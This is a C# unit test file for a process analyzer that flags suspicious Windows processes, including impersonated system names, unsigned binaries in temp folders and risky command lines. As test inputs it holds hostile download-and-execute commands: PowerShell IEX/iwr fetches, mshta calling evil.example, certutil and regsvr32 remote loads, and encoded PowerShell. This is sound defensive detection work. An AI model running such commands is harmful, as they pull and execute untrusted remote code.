using TempMonitor.Core.Processes;

namespace TempMonitor.Tests;

public class ProcessAnalyzerTests
{
    private static readonly ProcessAnalyzer Analyzer = new(@"C:\Windows");
    private static readonly SignatureInfo Signed = new(SignatureStatus.Signed, "Contoso Ltd", null);
    private static readonly SignatureInfo Unsigned = new(SignatureStatus.Unsigned, null, null);

    private static RawProcess Proc(string name, string? path, string? commandLine = null, int pid = 100) =>
        new(pid, 1, name, path, commandLine, new DateTime(2026, 1, 1));

    private static IReadOnlyList<ProcessFinding> Analyze(RawProcess process, SignatureInfo? signature = null, RawProcess? parent = null) =>
        Analyzer.Analyze(process, parent, signature ?? Signed);

    [Theory]
    [InlineData("svchost.exe", @"C:\Windows\System32\svchost.exe")]
    [InlineData("svchost.exe", @"C:\Windows\SysWOW64\svchost.exe")]
    [InlineData("explorer.exe", @"C:\Windows\explorer.exe")]
    [InlineData("notepad.exe", @"C:\Windows\System32\notepad.exe")]
    [InlineData("Code.exe", @"C:\Users\me\AppData\Local\Programs\Microsoft VS Code\Code.exe")]
    [InlineData("taskhost.exe", @"C:\Windows\System32\taskhost.exe")]
    public void LegitimateSignedProcesses_HaveNoFindings(string name, string path) =>
        Assert.Empty(Analyze(Proc(name, path)));

    [Fact]
    public void SystemProcessNameOutsideSystem32_IsHighImpersonation()
    {
        var findings = Analyze(Proc("svchost.exe", @"C:\Users\me\AppData\Roaming\svchost.exe"));

        Assert.Contains(findings, f => f.Severity == FindingSeverity.High && f.Title.Contains("Impersonates"));
    }

    [Theory]
    [InlineData("scvhost.exe", "svchost")]
    [InlineData("svch0st.exe", "svchost")]
    [InlineData("lsasss.exe", "lsass")]
    [InlineData("expl0rer.exe", "explorer")]
    public void LookalikeNames_AreFlagged(string name, string target)
    {
        var findings = Analyze(Proc(name, $@"C:\Tools\{name}"));

        Assert.Contains(findings, f => f.Severity == FindingSeverity.High && f.Title == $"Name imitates {target}.exe");
    }

    [Fact]
    public void UnsignedInTemp_IsSingleHighFinding()
    {
        var findings = Analyze(Proc("update.exe", @"C:\Users\me\AppData\Local\Temp\x\update.exe"), Unsigned);

        var finding = Assert.Single(findings);
        Assert.Equal(FindingSeverity.High, finding.Severity);
        Assert.Contains("temporary folder", finding.Title);
    }

    [Fact]
    public void SignedInTemp_IsDowngradedToLow()
    {
        var finding = Assert.Single(Analyze(Proc("setup.exe", @"C:\Users\me\AppData\Local\Temp\x\setup.exe")));

        Assert.Equal(FindingSeverity.Low, finding.Severity);
    }

    [Fact]
    public void SignedInDownloads_HasNoFinding() =>
        Assert.Empty(Analyze(Proc("setup.exe", @"C:\Users\me\Downloads\setup.exe")));

    [Fact]
    public void ExeDirectlyInAppDataRoaming_IsFlaggedButSubfolderIsNot()
    {
        Assert.NotEmpty(Analyze(Proc("helper.exe", @"C:\Users\me\AppData\Roaming\helper.exe"), Unsigned));
        Assert.DoesNotContain(
            Analyze(Proc("helper.exe", @"C:\Users\me\AppData\Roaming\Vendor\helper.exe"), Unsigned),
            f => f.Severity > FindingSeverity.Low);
    }

    [Fact]
    public void RecycleBin_IsHighEvenWhenUnsigned()
    {
        var findings = Analyze(Proc("x.exe", @"C:\$Recycle.Bin\S-1-5-21\x.exe"), Unsigned);

        Assert.Contains(findings, f => f.Severity == FindingSeverity.High && f.Title.Contains("Recycle Bin"));
    }

    [Fact]
    public void UnsignedInProgramFiles_IsLow()
    {
        var finding = Assert.Single(Analyze(Proc("tool.exe", @"C:\Program Files\Tool\tool.exe"), Unsigned));

        Assert.Equal(FindingSeverity.Low, finding.Severity);
    }

    [Fact]
    public void InvalidSignature_IsHigh()
    {
        var invalid = new SignatureInfo(SignatureStatus.Invalid, null, "The file was modified after it was signed.");

        Assert.Contains(Analyze(Proc("app.exe", @"C:\Program Files\App\app.exe"), invalid),
            f => f.Severity == FindingSeverity.High && f.Title == "Invalid digital signature");
    }

    [Theory]
    [InlineData("powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "Runs hidden (encoded) PowerShell code")]
    [InlineData("powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcA", "Runs hidden (encoded) PowerShell code")]
    [InlineData("powershell -w hidden -c Get-Date", "PowerShell with a hidden window")]
    [InlineData("powershell -WindowStyle Hidden -File x.ps1", "PowerShell with a hidden window")]
    [InlineData("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\"", "Downloads and runs code from the internet")]
    [InlineData("powershell -c \"iwr http://x/a.ps1 | iex\"", "Downloads and runs code from the internet")]
    [InlineData("powershell -ExecutionPolicy Bypass -File build.ps1", "Bypasses the PowerShell execution policy")]
    public void SuspiciousPowerShell_IsFlagged(string commandLine, string expectedTitle) =>
        Assert.Contains(Analyze(Proc("powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", commandLine)),
            f => f.Title == expectedTitle);

    [Theory]
    [InlineData("powershell -ExecutionPolicy RemoteSigned -File build.ps1")]
    [InlineData("powershell -NoProfile -Command Get-Process")]
    [InlineData("powershell -WindowStyle Normal -File x.ps1")]
    public void OrdinaryPowerShell_IsNotFlagged(string commandLine) =>
        Assert.Empty(Analyze(Proc("powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", commandLine)));

    [Theory]
    [InlineData("mshta.exe", "mshta http://evil.example/a.hta")]
    [InlineData("certutil.exe", "certutil -urlcache -split -f http://x/a.exe a.exe")]
    [InlineData("regsvr32.exe", "regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll")]
    [InlineData("rundll32.exe", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"")]
    public void LivingOffTheLandAbuse_IsHigh(string name, string commandLine) =>
        Assert.Contains(Analyze(Proc(name, $@"C:\Windows\System32\{name}", commandLine)), f => f.Severity == FindingSeverity.High);

    [Fact]
    public void OfficeSpawningShell_IsHigh()
    {
        var word = Proc("WINWORD.EXE", @"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", pid: 1);
        var cmd = Proc("cmd.exe", @"C:\Windows\System32\cmd.exe", "cmd /c whoami");

        Assert.Contains(Analyze(cmd, parent: word), f => f.Severity == FindingSeverity.High && f.Title == "Started by WINWORD.EXE");
    }

    [Fact]
    public void ExplorerSpawningShell_IsNotFlagged()
    {
        var explorer = Proc("explorer.exe", @"C:\Windows\explorer.exe", pid: 1);

        Assert.Empty(Analyze(Proc("cmd.exe", @"C:\Windows\System32\cmd.exe"), parent: explorer));
    }

    [Fact]
    public void ProcessWithoutPath_StillGetsNameAndCommandLineChecks()
    {
        var findings = Analyzer.Analyze(Proc("svch0st.exe", path: null), parent: null, signature: null);

        Assert.Contains(findings, f => f.Title == "Name imitates svchost.exe");
    }

    [Theory]
    [InlineData("svchost", "svchost", 0)]
    [InlineData("svchost", "scvhost", 1)]
    [InlineData("svchost", "svhost", 1)]
    [InlineData("lsass", "lsaiso", 2)]
    public void EditDistance_CountsSingleEditsAndSwaps(string a, string b, int expected) =>
        Assert.Equal(expected, ProcessAnalyzer.EditDistance(a, b));
}
